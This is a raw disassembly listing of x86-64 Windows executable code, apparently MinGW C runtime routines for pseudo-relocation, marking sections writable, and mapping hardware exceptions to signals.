   14000557e:	49 89 c1             	mov    %rax,%r9
   140005581:	e8 2a 65 00 00       	call   0x14000bab0
   140005586:	48 8b 74 24 28       	mov    0x28(%rsp),%rsi
   14000558b:	b9 02 00 00 00       	mov    $0x2,%ecx
   140005590:	e8 ab 60 00 00       	call   0x14000b640
   140005595:	48 89 da             	mov    %rbx,%rdx
   140005598:	48 89 c1             	mov    %rax,%rcx
   14000559b:	49 89 f0             	mov    %rsi,%r8
   14000559e:	e8 5d 65 00 00       	call   0x14000bb00
   1400055a3:	e8 d0 64 00 00       	call   0x14000ba78
   1400055a8:	90                   	nop
   1400055a9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400055b0:	41 54                	push   %r12
   1400055b2:	55                   	push   %rbp
   1400055b3:	57                   	push   %rdi
   1400055b4:	56                   	push   %rsi
   1400055b5:	53                   	push   %rbx
   1400055b6:	48 83 ec 50          	sub    $0x50,%rsp
   1400055ba:	48 63 35 e3 6a 38 00 	movslq 0x386ae3(%rip),%rsi        # 0x14038c0a4
   1400055c1:	85 f6                	test   %esi,%esi
   1400055c3:	48 89 cf             	mov    %rcx,%rdi
   1400055c6:	48 89 d5             	mov    %rdx,%rbp
   1400055c9:	4c 89 c3             	mov    %r8,%rbx
   1400055cc:	0f 8e 6e 01 00 00    	jle    0x140005740
   1400055d2:	48 8b 05 cf 6a 38 00 	mov    0x386acf(%rip),%rax        # 0x14038c0a8
   1400055d9:	31 c9                	xor    %ecx,%ecx
   1400055db:	48 83 c0 18          	add    $0x18,%rax
   1400055df:	90                   	nop
   1400055e0:	48 8b 10             	mov    (%rax),%rdx
   1400055e3:	48 39 d7             	cmp    %rdx,%rdi
   1400055e6:	72 14                	jb     0x1400055fc
   1400055e8:	4c 8b 40 08          	mov    0x8(%rax),%r8
   1400055ec:	45 8b 40 08          	mov    0x8(%r8),%r8d
   1400055f0:	4c 01 c2             	add    %r8,%rdx
   1400055f3:	48 39 d7             	cmp    %rdx,%rdi
   1400055f6:	0f 82 89 00 00 00    	jb     0x140005685
   1400055fc:	83 c1 01             	add    $0x1,%ecx
   1400055ff:	48 83 c0 28          	add    $0x28,%rax
   140005603:	39 f1                	cmp    %esi,%ecx
   140005605:	75 d9                	jne    0x1400055e0
   140005607:	48 89 f9             	mov    %rdi,%rcx
   14000560a:	e8 41 0e 00 00       	call   0x140006450
   14000560f:	48 85 c0             	test   %rax,%rax
   140005612:	49 89 c4             	mov    %rax,%r12
   140005615:	0f 84 77 01 00 00    	je     0x140005792
   14000561b:	48 8b 05 86 6a 38 00 	mov    0x386a86(%rip),%rax        # 0x14038c0a8
   140005622:	48 8d 34 b6          	lea    (%rsi,%rsi,4),%rsi
   140005626:	48 c1 e6 03          	shl    $0x3,%rsi
   14000562a:	48 01 f0             	add    %rsi,%rax
   14000562d:	4c 89 60 20          	mov    %r12,0x20(%rax)
   140005631:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   140005637:	e8 54 0f 00 00       	call   0x140006590
   14000563c:	41 8b 4c 24 0c       	mov    0xc(%r12),%ecx
   140005641:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140005646:	41 b8 30 00 00 00    	mov    $0x30,%r8d
   14000564c:	48 01 c1             	add    %rax,%rcx
   14000564f:	48 8b 05 52 6a 38 00 	mov    0x386a52(%rip),%rax        # 0x14038c0a8
   140005656:	48 89 4c 30 18       	mov    %rcx,0x18(%rax,%rsi,1)
   14000565b:	ff 15 7b 7c 38 00    	call   *0x387c7b(%rip)        # 0x14038d2dc
   140005661:	48 85 c0             	test   %rax,%rax
   140005664:	0f 84 0b 01 00 00    	je     0x140005775
   14000566a:	8b 44 24 44          	mov    0x44(%rsp),%eax
   14000566e:	8d 50 c0             	lea    -0x40(%rax),%edx
   140005671:	83 e2 bf             	and    $0xffffffbf,%edx
   140005674:	74 08                	je     0x14000567e
   140005676:	8d 50 fc             	lea    -0x4(%rax),%edx
   140005679:	83 e2 fb             	and    $0xfffffffb,%edx
   14000567c:	75 72                	jne    0x1400056f0
   14000567e:	83 05 1f 6a 38 00 01 	addl   $0x1,0x386a1f(%rip)        # 0x14038c0a4
   140005685:	83 fb 08             	cmp    $0x8,%ebx
   140005688:	73 27                	jae    0x1400056b1
   14000568a:	f6 c3 04             	test   $0x4,%bl
   14000568d:	0f 85 bd 00 00 00    	jne    0x140005750
   140005693:	85 db                	test   %ebx,%ebx
   140005695:	74 0f                	je     0x1400056a6
   140005697:	0f b6 45 00          	movzbl 0x0(%rbp),%eax
   14000569b:	f6 c3 02             	test   $0x2,%bl
   14000569e:	88 07                	mov    %al,(%rdi)
   1400056a0:	0f 85 be 00 00 00    	jne    0x140005764
   1400056a6:	48 83 c4 50          	add    $0x50,%rsp
   1400056aa:	5b                   	pop    %rbx
   1400056ab:	5e                   	pop    %rsi
   1400056ac:	5f                   	pop    %rdi
   1400056ad:	5d                   	pop    %rbp
   1400056ae:	41 5c                	pop    %r12
   1400056b0:	c3                   	ret
   1400056b1:	89 d8                	mov    %ebx,%eax
   1400056b3:	83 eb 01             	sub    $0x1,%ebx
   1400056b6:	48 8b 54 05 f8       	mov    -0x8(%rbp,%rax,1),%rdx
   1400056bb:	83 fb 08             	cmp    $0x8,%ebx
   1400056be:	48 89 54 07 f8       	mov    %rdx,-0x8(%rdi,%rax,1)
   1400056c3:	72 e1                	jb     0x1400056a6
   1400056c5:	83 e3 f8             	and    $0xfffffff8,%ebx
   1400056c8:	31 c0                	xor    %eax,%eax
   1400056ca:	89 c2                	mov    %eax,%edx
   1400056cc:	83 c0 08             	add    $0x8,%eax
   1400056cf:	48 8b 4c 15 00       	mov    0x0(%rbp,%rdx,1),%rcx
   1400056d4:	39 d8                	cmp    %ebx,%eax
   1400056d6:	48 89 0c 17          	mov    %rcx,(%rdi,%rdx,1)
   1400056da:	72 ee                	jb     0x1400056ca
   1400056dc:	48 83 c4 50          	add    $0x50,%rsp
   1400056e0:	5b                   	pop    %rbx
   1400056e1:	5e                   	pop    %rsi
   1400056e2:	5f                   	pop    %rdi
   1400056e3:	5d                   	pop    %rbp
   1400056e4:	41 5c                	pop    %r12
   1400056e6:	c3                   	ret
   1400056e7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400056ee:	00 00 
   1400056f0:	83 f8 02             	cmp    $0x2,%eax
   1400056f3:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   1400056f9:	b8 40 00 00 00       	mov    $0x40,%eax
   1400056fe:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140005703:	44 0f 45 c0          	cmovne %eax,%r8d
   140005707:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   14000570c:	48 03 35 95 69 38 00 	add    0x386995(%rip),%rsi        # 0x14038c0a8
   140005713:	49 89 f1             	mov    %rsi,%r9
   140005716:	48 89 4e 08          	mov    %rcx,0x8(%rsi)
   14000571a:	48 89 56 10          	mov    %rdx,0x10(%rsi)
   14000571e:	ff 15 b0 7b 38 00    	call   *0x387bb0(%rip)        # 0x14038d2d4
   140005724:	85 c0                	test   %eax,%eax
   140005726:	0f 85 52 ff ff ff    	jne    0x14000567e
   14000572c:	ff 15 2a 7b 38 00    	call   *0x387b2a(%rip)        # 0x14038d25c
   140005732:	48 8d 0d bf 3e 38 00 	lea    0x383ebf(%rip),%rcx        # 0x1403895f8
   140005739:	89 c2                	mov    %eax,%edx
   14000573b:	e8 00 fe ff ff       	call   0x140005540
   140005740:	31 f6                	xor    %esi,%esi
   140005742:	e9 c0 fe ff ff       	jmp    0x140005607
   140005747:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000574e:	00 00 
   140005750:	8b 45 00             	mov    0x0(%rbp),%eax
   140005753:	89 db                	mov    %ebx,%ebx
   140005755:	89 07                	mov    %eax,(%rdi)
   140005757:	8b 44 1d fc          	mov    -0x4(%rbp,%rbx,1),%eax
   14000575b:	89 44 1f fc          	mov    %eax,-0x4(%rdi,%rbx,1)
   14000575f:	e9 42 ff ff ff       	jmp    0x1400056a6
   140005764:	89 db                	mov    %ebx,%ebx
   140005766:	0f b7 44 1d fe       	movzwl -0x2(%rbp,%rbx,1),%eax
   14000576b:	66 89 44 1f fe       	mov    %ax,-0x2(%rdi,%rbx,1)
   140005770:	e9 31 ff ff ff       	jmp    0x1400056a6
   140005775:	48 8b 05 2c 69 38 00 	mov    0x38692c(%rip),%rax        # 0x14038c0a8
   14000577c:	48 8d 0d 3d 3e 38 00 	lea    0x383e3d(%rip),%rcx        # 0x1403895c0
   140005783:	41 8b 54 24 08       	mov    0x8(%r12),%edx
   140005788:	4c 8b 44 30 18       	mov    0x18(%rax,%rsi,1),%r8
   14000578d:	e8 ae fd ff ff       	call   0x140005540
   140005792:	48 8d 0d 07 3e 38 00 	lea    0x383e07(%rip),%rcx        # 0x1403895a0
   140005799:	48 89 fa             	mov    %rdi,%rdx
   14000579c:	e8 9f fd ff ff       	call   0x140005540
   1400057a1:	90                   	nop
   1400057a2:	0f 1f 40 00          	nopl   0x0(%rax)
   1400057a6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400057ad:	00 00 00 
   1400057b0:	55                   	push   %rbp
   1400057b1:	41 57                	push   %r15
   1400057b3:	41 56                	push   %r14
   1400057b5:	41 55                	push   %r13
   1400057b7:	41 54                	push   %r12
   1400057b9:	57                   	push   %rdi
   1400057ba:	56                   	push   %rsi
   1400057bb:	53                   	push   %rbx
   1400057bc:	48 83 ec 48          	sub    $0x48,%rsp
   1400057c0:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
   1400057c7:	00 
   1400057c8:	8b 35 d2 68 38 00    	mov    0x3868d2(%rip),%esi        # 0x14038c0a0
   1400057ce:	85 f6                	test   %esi,%esi
   1400057d0:	74 11                	je     0x1400057e3
   1400057d2:	48 8d 65 c8          	lea    -0x38(%rbp),%rsp
   1400057d6:	5b                   	pop    %rbx
   1400057d7:	5e                   	pop    %rsi
   1400057d8:	5f                   	pop    %rdi
   1400057d9:	41 5c                	pop    %r12
   1400057db:	41 5d                	pop    %r13
   1400057dd:	41 5e                	pop    %r14
   1400057df:	41 5f                	pop    %r15
   1400057e1:	5d                   	pop    %rbp
   1400057e2:	c3                   	ret
   1400057e3:	c7 05 b3 68 38 00 01 	movl   $0x1,0x3868b3(%rip)        # 0x14038c0a0
   1400057ea:	00 00 00 
   1400057ed:	e8 de 0c 00 00       	call   0x1400064d0
   1400057f2:	48 98                	cltq
   1400057f4:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   1400057f8:	48 8d 04 c5 0f 00 00 	lea    0xf(,%rax,8),%rax
   1400057ff:	00 
   140005800:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   140005804:	e8 07 0f 00 00       	call   0x140006710
   140005809:	48 8b 3d 40 43 38 00 	mov    0x384340(%rip),%rdi        # 0x140389b50
   140005810:	c7 05 8a 68 38 00 00 	movl   $0x0,0x38688a(%rip)        # 0x14038c0a4
   140005817:	00 00 00 
   14000581a:	48 8b 1d 3f 43 38 00 	mov    0x38433f(%rip),%rbx        # 0x140389b60
   140005821:	48 29 c4             	sub    %rax,%rsp
   140005824:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140005829:	48 89 05 78 68 38 00 	mov    %rax,0x386878(%rip)        # 0x14038c0a8
   140005830:	48 89 f8             	mov    %rdi,%rax
   140005833:	48 29 d8             	sub    %rbx,%rax
   140005836:	48 83 f8 07          	cmp    $0x7,%rax
   14000583a:	7e 96                	jle    0x1400057d2
   14000583c:	48 83 f8 0b          	cmp    $0xb,%rax
   140005840:	8b 13                	mov    (%rbx),%edx
   140005842:	0f 8f 3b 01 00 00    	jg     0x140005983
   140005848:	85 d2                	test   %edx,%edx
   14000584a:	0f 85 42 02 00 00    	jne    0x140005a92
   140005850:	8b 43 04             	mov    0x4(%rbx),%eax
   140005853:	85 c0                	test   %eax,%eax
   140005855:	0f 85 37 02 00 00    	jne    0x140005a92
   14000585b:	8b 53 08             	mov    0x8(%rbx),%edx
   14000585e:	83 fa 01             	cmp    $0x1,%edx
   140005861:	0f 85 ab 02 00 00    	jne    0x140005b12
   140005867:	4c 8b 2d 12 43 38 00 	mov    0x384312(%rip),%r13        # 0x140389b80
   14000586e:	4c 8d 65 b8          	lea    -0x48(%rbp),%r12
   140005872:	48 83 c3 0c          	add    $0xc,%rbx
   140005876:	48 39 fb             	cmp    %rdi,%rbx
   140005879:	72 50                	jb     0x1400058cb
   14000587b:	e9 52 ff ff ff       	jmp    0x1400057d2
   140005880:	49 be 00 00 00 00 ff 	movabs $0xffffffff00000000,%r14
   140005887:	ff ff ff 
   14000588a:	41 8b 02             	mov    (%r10),%eax
   14000588d:	49 89 c3             	mov    %rax,%r11
   140005890:	4c 09 f0             	or     %r14,%rax
   140005893:	45 85 db             	test   %r11d,%r11d
   140005896:	49 0f 49 c3          	cmovns %r11,%rax
   14000589a:	48 29 c8             	sub    %rcx,%rax
   14000589d:	4c 01 c8             	add    %r9,%rax
   1400058a0:	41 81 e0 c0 00 00 00 	and    $0xc0,%r8d
   1400058a7:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
   1400058ab:	0f 84 3f 01 00 00    	je     0x1400059f0
   1400058b1:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   1400058b7:	4c 89 e2             	mov    %r12,%rdx
   1400058ba:	4c 89 d1             	mov    %r10,%rcx
   1400058bd:	e8 ee fc ff ff       	call   0x1400055b0
   1400058c2:	48 83 c3 0c          	add    $0xc,%rbx
   1400058c6:	48 39 fb             	cmp    %rdi,%rbx
   1400058c9:	73 68                	jae    0x140005933
   1400058cb:	44 8b 43 08          	mov    0x8(%rbx),%r8d
   1400058cf:	44 8b 53 04          	mov    0x4(%rbx),%r10d
   1400058d3:	8b 0b                	mov    (%rbx),%ecx
   1400058d5:	41 0f b6 d0          	movzbl %r8b,%edx
   1400058d9:	4d 01 ea             	add    %r13,%r10
   1400058dc:	4c 01 e9             	add    %r13,%rcx
   1400058df:	83 fa 10             	cmp    $0x10,%edx
   1400058e2:	4c 8b 09             	mov    (%rcx),%r9
   1400058e5:	0f 84 65 01 00 00    	je     0x140005a50
   1400058eb:	0f 86 b4 00 00 00    	jbe    0x1400059a5
   1400058f1:	83 fa 20             	cmp    $0x20,%edx
   1400058f4:	74 8a                	je     0x140005880
   1400058f6:	83 fa 40             	cmp    $0x40,%edx
   1400058f9:	0f 85 eb 01 00 00    	jne    0x140005aea
   1400058ff:	49 8b 02             	mov    (%r10),%rax
   140005902:	48 29 c8             	sub    %rcx,%rax
   140005905:	4c 01 c8             	add    %r9,%rax
   140005908:	41 81 e0 c0 00 00 00 	and    $0xc0,%r8d
   14000590f:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
   140005913:	0f 84 d7 00 00 00    	je     0x1400059f0
   140005919:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   14000591f:	4c 89 e2             	mov    %r12,%rdx
   140005922:	4c 89 d1             	mov    %r10,%rcx
   140005925:	e8 86 fc ff ff       	call   0x1400055b0
   14000592a:	48 83 c3 0c          	add    $0xc,%rbx
   14000592e:	48 39 fb             	cmp    %rdi,%rbx
   140005931:	72 98                	jb     0x1400058cb
   140005933:	8b 05 6b 67 38 00    	mov    0x38676b(%rip),%eax        # 0x14038c0a4
   140005939:	85 c0                	test   %eax,%eax
   14000593b:	0f 8e 91 fe ff ff    	jle    0x1400057d2
   140005941:	48 8b 3d 8c 79 38 00 	mov    0x38798c(%rip),%rdi        # 0x14038d2d4
   140005948:	4c 8d 65 b8          	lea    -0x48(%rbp),%r12
   14000594c:	31 db                	xor    %ebx,%ebx
   14000594e:	66 90                	xchg   %ax,%ax
   140005950:	48 8b 05 51 67 38 00 	mov    0x386751(%rip),%rax        # 0x14038c0a8
   140005957:	48 01 d8             	add    %rbx,%rax
   14000595a:	44 8b 00             	mov    (%rax),%r8d
   14000595d:	45 85 c0             	test   %r8d,%r8d
   140005960:	74 0d                	je     0x14000596f
   140005962:	48 8b 50 10          	mov    0x10(%rax),%rdx
   140005966:	4d 89 e1             	mov    %r12,%r9
   140005969:	48 8b 48 08          	mov    0x8(%rax),%rcx
   14000596d:	ff d7                	call   *%rdi
   14000596f:	83 c6 01             	add    $0x1,%esi
   140005972:	48 83 c3 28          	add    $0x28,%rbx
   140005976:	3b 35 28 67 38 00    	cmp    0x386728(%rip),%esi        # 0x14038c0a4
   14000597c:	7c d2                	jl     0x140005950
   14000597e:	e9 4f fe ff ff       	jmp    0x1400057d2
   140005983:	85 d2                	test   %edx,%edx
   140005985:	0f 85 07 01 00 00    	jne    0x140005a92
   14000598b:	8b 43 04             	mov    0x4(%rbx),%eax
   14000598e:	89 c2                	mov    %eax,%edx
   140005990:	0b 53 08             	or     0x8(%rbx),%edx
   140005993:	0f 85 ba fe ff ff    	jne    0x140005853
   140005999:	8b 53 0c             	mov    0xc(%rbx),%edx
   14000599c:	48 83 c3 0c          	add    $0xc,%rbx
   1400059a0:	e9 a3 fe ff ff       	jmp    0x140005848
   1400059a5:	83 fa 08             	cmp    $0x8,%edx
   1400059a8:	0f 85 3c 01 00 00    	jne    0x140005aea
   1400059ae:	41 0f b6 02          	movzbl (%r10),%eax
   1400059b2:	49 89 c7             	mov    %rax,%r15
   1400059b5:	49 81 cf 00 ff ff ff 	or     $0xffffffffffffff00,%r15
   1400059bc:	84 c0                	test   %al,%al
   1400059be:	49 0f 48 c7          	cmovs  %r15,%rax
   1400059c2:	48 29 c8             	sub    %rcx,%rax
   1400059c5:	4c 01 c8             	add    %r9,%rax
   1400059c8:	41 81 e0 c0 00 00 00 	and    $0xc0,%r8d
   1400059cf:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
   1400059d3:	74 1b                	je     0x1400059f0
   1400059d5:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400059db:	4c 89 e2             	mov    %r12,%rdx
   1400059de:	4c 89 d1             	mov    %r10,%rcx
   1400059e1:	e8 ca fb ff ff       	call   0x1400055b0
   1400059e6:	e9 d7 fe ff ff       	jmp    0x1400058c2
   1400059eb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400059f0:	8d 4a ff             	lea    -0x1(%rdx),%ecx
   1400059f3:	49 c7 c7 ff ff ff ff 	mov    $0xffffffffffffffff,%r15
   1400059fa:	49 d3 e7             	shl    %cl,%r15
   1400059fd:	49 39 c7             	cmp    %rax,%r15
   140005a00:	0f 8f f8 00 00 00    	jg     0x140005afe
   140005a06:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140005a0c:	89 d1                	mov    %edx,%ecx
   140005a0e:	49 d3 e0             	shl    %cl,%r8
   140005a11:	49 39 c0             	cmp    %rax,%r8
   140005a14:	0f 8e e4 00 00 00    	jle    0x140005afe
   140005a1a:	83 fa 10             	cmp    $0x10,%edx
   140005a1d:	74 5d                	je     0x140005a7c
   140005a1f:	76 1f                	jbe    0x140005a40
   140005a21:	83 fa 20             	cmp    $0x20,%edx
   140005a24:	0f 84 87 fe ff ff    	je     0x1400058b1
   140005a2a:	83 fa 40             	cmp    $0x40,%edx
   140005a2d:	0f 85 8f fe ff ff    	jne    0x1400058c2
   140005a33:	e9 e1 fe ff ff       	jmp    0x140005919
   140005a38:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140005a3f:	00 
   140005a40:	83 fa 08             	cmp    $0x8,%edx
   140005a43:	0f 85 79 fe ff ff    	jne    0x1400058c2
   140005a49:	eb 8a                	jmp    0x1400059d5
   140005a4b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005a50:	41 0f b7 02          	movzwl (%r10),%eax
   140005a54:	49 89 c3             	mov    %rax,%r11
   140005a57:	49 81 cb 00 00 ff ff 	or     $0xffffffffffff0000,%r11
   140005a5e:	66 85 c0             	test   %ax,%ax
   140005a61:	49 0f 48 c3          	cmovs  %r11,%rax
   140005a65:	48 29 c8             	sub    %rcx,%rax
   140005a68:	4c 01 c8             	add    %r9,%rax
   140005a6b:	41 81 e0 c0 00 00 00 	and    $0xc0,%r8d
   140005a72:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
   140005a76:	0f 84 74 ff ff ff    	je     0x1400059f0
   140005a7c:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140005a82:	4c 89 e2             	mov    %r12,%rdx
   140005a85:	4c 89 d1             	mov    %r10,%rcx
   140005a88:	e8 23 fb ff ff       	call   0x1400055b0
   140005a8d:	e9 30 fe ff ff       	jmp    0x1400058c2
   140005a92:	48 39 fb             	cmp    %rdi,%rbx
   140005a95:	0f 83 37 fd ff ff    	jae    0x1400057d2
   140005a9b:	48 83 ef 01          	sub    $0x1,%rdi
   140005a9f:	4c 8b 25 da 40 38 00 	mov    0x3840da(%rip),%r12        # 0x140389b80
   140005aa6:	48 29 df             	sub    %rbx,%rdi
   140005aa9:	48 c1 ef 03          	shr    $0x3,%rdi
   140005aad:	4c 8d 6c fb 08       	lea    0x8(%rbx,%rdi,8),%r13
   140005ab2:	48 8d 7d b8          	lea    -0x48(%rbp),%rdi
   140005ab6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140005abd:	00 00 00 
   140005ac0:	8b 4b 04             	mov    0x4(%rbx),%ecx
   140005ac3:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140005ac9:	48 89 fa             	mov    %rdi,%rdx
   140005acc:	48 83 c3 08          	add    $0x8,%rbx
   140005ad0:	8b 43 f8             	mov    -0x8(%rbx),%eax
   140005ad3:	4c 01 e1             	add    %r12,%rcx
   140005ad6:	03 01                	add    (%rcx),%eax
   140005ad8:	89 45 b8             	mov    %eax,-0x48(%rbp)
   140005adb:	e8 d0 fa ff ff       	call   0x1400055b0
   140005ae0:	4c 39 eb             	cmp    %r13,%rbx
   140005ae3:	75 db                	jne    0x140005ac0
   140005ae5:	e9 49 fe ff ff       	jmp    0x140005933
   140005aea:	48 8d 0d 67 3b 38 00 	lea    0x383b67(%rip),%rcx        # 0x140389658
   140005af1:	48 c7 45 b8 00 00 00 	movq   $0x0,-0x48(%rbp)
   140005af8:	00 
   140005af9:	e8 42 fa ff ff       	call   0x140005540
   140005afe:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005b03:	48 8d 0d 7e 3b 38 00 	lea    0x383b7e(%rip),%rcx        # 0x140389688
   140005b0a:	4d 89 d0             	mov    %r10,%r8
   140005b0d:	e8 2e fa ff ff       	call   0x140005540
   140005b12:	48 8d 0d 07 3b 38 00 	lea    0x383b07(%rip),%rcx        # 0x140389620
   140005b19:	e8 22 fa ff ff       	call   0x140005540
   140005b1e:	90                   	nop
   140005b1f:	90                   	nop
   140005b20:	48 83 ec 58          	sub    $0x58,%rsp
   140005b24:	48 8b 05 85 65 38 00 	mov    0x386585(%rip),%rax        # 0x14038c0b0
   140005b2b:	48 85 c0             	test   %rax,%rax
   140005b2e:	74 2c                	je     0x140005b5c
   140005b30:	f2 0f 10 84 24 80 00 	movsd  0x80(%rsp),%xmm0
   140005b37:	00 00 
   140005b39:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   140005b3d:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140005b42:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   140005b47:	f2 0f 11 54 24 30    	movsd  %xmm2,0x30(%rsp)
   140005b4d:	f2 0f 11 5c 24 38    	movsd  %xmm3,0x38(%rsp)
   140005b53:	f2 0f 11 44 24 40    	movsd  %xmm0,0x40(%rsp)
   140005b59:	ff d0                	call   *%rax
   140005b5b:	90                   	nop
   140005b5c:	48 83 c4 58          	add    $0x58,%rsp
   140005b60:	c3                   	ret
   140005b61:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005b66:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140005b6d:	00 00 00 
   140005b70:	48 89 0d 39 65 38 00 	mov    %rcx,0x386539(%rip)        # 0x14038c0b0
   140005b77:	e9 ac 5e 00 00       	jmp    0x14000ba28
   140005b7c:	90                   	nop
   140005b7d:	90                   	nop
   140005b7e:	90                   	nop
   140005b7f:	90                   	nop
   140005b80:	53                   	push   %rbx
   140005b81:	48 83 ec 20          	sub    $0x20,%rsp
   140005b85:	48 8b 11             	mov    (%rcx),%rdx
   140005b88:	8b 02                	mov    (%rdx),%eax
   140005b8a:	48 89 cb             	mov    %rcx,%rbx
   140005b8d:	89 c1                	mov    %eax,%ecx
   140005b8f:	81 e1 ff ff ff 20    	and    $0x20ffffff,%ecx
   140005b95:	81 f9 43 43 47 20    	cmp    $0x20474343,%ecx
   140005b9b:	0f 84 4f 01 00 00    	je     0x140005cf0
   140005ba1:	3d 91 00 00 c0       	cmp    $0xc0000091,%eax
   140005ba6:	77 5b                	ja     0x140005c03
   140005ba8:	3d 8d 00 00 c0       	cmp    $0xc000008d,%eax
   140005bad:	73 73                	jae    0x140005c22
   140005baf:	3d 08 00 00 c0       	cmp    $0xc0000008,%eax
   140005bb4:	0f 84 96 00 00 00    	je     0x140005c50
   140005bba:	0f 87 e0 00 00 00    	ja     0x140005ca0
   140005bc0:	3d 02 00 00 80       	cmp    $0x80000002,%eax
   140005bc5:	0f 84 85 00 00 00    	je     0x140005c50
   140005bcb:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
   140005bd0:	0f 85 d8 00 00 00    	jne    0x140005cae
   140005bd6:	31 d2                	xor    %edx,%edx
   140005bd8:	b9 0b 00 00 00       	mov    $0xb,%ecx
   140005bdd:	e8 fe 5e 00 00       	call   0x14000bae0
   140005be2:	48 83 f8 01          	cmp    $0x1,%rax
   140005be6:	0f 84 54 01 00 00    	je     0x140005d40
   140005bec:	48 85 c0             	test   %rax,%rax
   140005bef:	0f 84 b9 00 00 00    	je     0x140005cae
   140005bf5:	b9 0b 00 00 00       	mov    $0xb,%ecx
   140005bfa:	ff d0                	call   *%rax
   140005bfc:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140005c01:	eb 52                	jmp    0x140005c55
   140005c03:	3d 94 00 00 c0       	cmp    $0xc0000094,%eax
   140005c08:	0f 84 b7 00 00 00    	je     0x140005cc5
   140005c0e:	77 50                	ja     0x140005c60
   140005c10:	3d 92 00 00 c0       	cmp    $0xc0000092,%eax
   140005c15:	74 39                	je     0x140005c50
   140005c17:	3d 93 00 00 c0       	cmp    $0xc0000093,%eax
   140005c1c:	0f 85 8c 00 00 00    	jne    0x140005cae
   140005c22:	31 d2                	xor    %edx,%edx
   140005c24:	b9 08 00 00 00       	mov    $0x8,%ecx
   140005c29:	e8 b2 5e 00 00       	call   0x14000bae0
   140005c2e:	48 83 f8 01          	cmp    $0x1,%rax
   140005c32:	0f 85 9f 00 00 00    	jne    0x140005cd7
   140005c38:	ba 01 00 00 00       	mov    $0x1,%edx
   140005c3d:	b9 08 00 00 00       	mov    $0x8,%ecx
   140005c42:	e8 99 5e 00 00       	call   0x14000bae0
   140005c47:	e8 e4 f8 ff ff       	call   0x140005530
   140005c4c:	0f 1f 40 00          	nopl   0x0(%rax)
   140005c50:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140005c55:	48 83 c4 20          	add    $0x20,%rsp
   140005c59:	5b                   	pop    %rbx
   140005c5a:	c3                   	ret
   140005c5b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005c60:	3d 95 00 00 c0       	cmp    $0xc0000095,%eax
   140005c65:	74 e9                	je     0x140005c50
   140005c67:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
   140005c6c:	75 40                	jne    0x140005cae
   140005c6e:	31 d2                	xor    %edx,%edx
   140005c70:	b9 04 00 00 00       	mov    $0x4,%ecx
   140005c75:	e8 66 5e 00 00       	call   0x14000bae0
   140005c7a:	48 83 f8 01          	cmp    $0x1,%rax
   140005c7e:	0f 84 a5 00 00 00    	je     0x140005d29
   140005c84:	48 85 c0             	test   %rax,%rax
   140005c87:	74 25                	je     0x140005cae
   140005c89:	b9 04 00 00 00       	mov    $0x4,%ecx
   140005c8e:	ff d0                	call   *%rax
   140005c90:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140005c95:	eb be                	jmp    0x140005c55
   140005c97:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140005c9e:	00 00 
   140005ca0:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
   140005ca5:	74 c7                	je     0x140005c6e
   140005ca7:	3d 8c 00 00 c0       	cmp    $0xc000008c,%eax
   140005cac:	74 a2                	je     0x140005c50
   140005cae:	48 8b 05 1b 64 38 00 	mov    0x38641b(%rip),%rax        # 0x14038c0d0
   140005cb5:	48 85 c0             	test   %rax,%rax
   140005cb8:	74 46                	je     0x140005d00
   140005cba:	48 89 d9             	mov    %rbx,%rcx
   140005cbd:	48 83 c4 20          	add    $0x20,%rsp
   140005cc1:	5b                   	pop    %rbx
   140005cc2:	48 ff e0             	rex.W jmp *%rax
   140005cc5:	31 d2                	xor    %edx,%edx
   140005cc7:	b9 08 00 00 00       	mov    $0x8,%ecx
   140005ccc:	e8 0f 5e 00 00       	call   0x14000bae0
   140005cd1:	48 83 f8 01          	cmp    $0x1,%rax
   140005cd5:	74 39                	je     0x140005d10
   140005cd7:	48 85 c0             	test   %rax,%rax
   140005cda:	74 d2                	je     0x140005cae
   140005cdc:	b9 08 00 00 00       	mov    $0x8,%ecx
   140005ce1:	ff d0                	call   *%rax
   140005ce3:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140005ce8:	e9 68 ff ff ff       	jmp    0x140005c55
   140005ced:	0f 1f 00             	nopl   (%rax)
